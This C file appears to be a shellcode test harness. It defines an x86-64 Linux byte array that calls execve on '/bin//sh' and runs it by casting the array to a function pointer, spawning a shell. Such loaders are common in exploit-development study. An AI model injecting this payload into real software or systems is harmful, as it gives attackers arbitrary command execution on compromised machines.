#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = "\x48\x31\xf6\x48\x31\xd2\x52"
                            "\x48\xb8\x2f\x2f\x62\x69\x6e"
                            "\x2f\x73\x68\x50\x48\x89\xe7"
                            "\x48\x31\xc0\xb0\x3b\x0f\x05";

int main(void) {
  printf("[*] shellcode length: %d\n", strlen(shellcode));
  (*(void (*)())shellcode)();
  return 0;
}

